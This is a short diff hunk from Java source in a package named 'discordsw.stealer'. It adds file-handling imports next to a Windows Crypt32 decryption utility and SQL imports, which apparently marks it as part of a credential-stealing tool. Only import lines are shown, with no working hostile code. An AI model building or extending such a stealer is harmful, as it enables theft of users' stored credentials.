@@ -2,7 +2,11 @@ package me.mafrans.discordsw.stealer;
 
 import com.sun.jna.platform.win32.Crypt32Util;
 
+import java.io.File;
+import java.io.IOException;
 import java.io.UnsupportedEncodingException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.sql.*;
 import java.util.ArrayList;
 import java.util.List;
